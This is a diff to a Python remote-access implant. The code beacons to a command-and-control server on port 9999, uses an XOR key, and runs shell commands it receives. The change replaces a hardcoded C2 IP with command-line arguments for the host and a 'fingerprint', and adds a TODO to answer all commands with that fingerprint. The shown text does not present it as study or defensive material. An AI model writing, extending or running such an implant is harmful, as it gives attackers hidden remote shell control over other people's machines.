@@ -6,8 +6,10 @@ import subprocess
 import sys
 import os
 
+
+# TODO: implement logic to work with C2 system -- respond to all commands with a fingerprint
+
 # setup C2 connection details
-C2_HOST = '10.128.0.3'
 C2_PORT = 9999
 BEACON_INTERVAL = 10
 XOR_KEY = b'stonecap'
@@ -48,15 +50,15 @@ def run_shell_command(command):
         return f"ERROR|Exception executing command: {e}"
 
 # Main function to run implant
-def run_implant():
+def run_implant(ip, fingerprint):
     while True:
         sock = None
         # try to connect to c2
         try:
-            print(f"[*] Attempting connection to {C2_HOST}:{C2_PORT}...")
+            print(f"[*] Attempting connection to {ip}:{C2_PORT}...")
             sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
             sock.settimeout(10.0)
-            sock.connect((C2_HOST, C2_PORT))
+            sock.connect((ip, C2_PORT))
             sock.settimeout(None)
             print("[*] Implant: Connected.")
 
@@ -191,4 +193,9 @@ def run_implant():
         time.sleep(BEACON_INTERVAL)
 
 if __name__ == "__main__":
-    run_implant()
+    # get arguments ip and fingerprint
+    
+    ip = sys.argv[1]
+    fingerprint = sys.argv[2]
+
+    run_implant(ip, fingerprint)
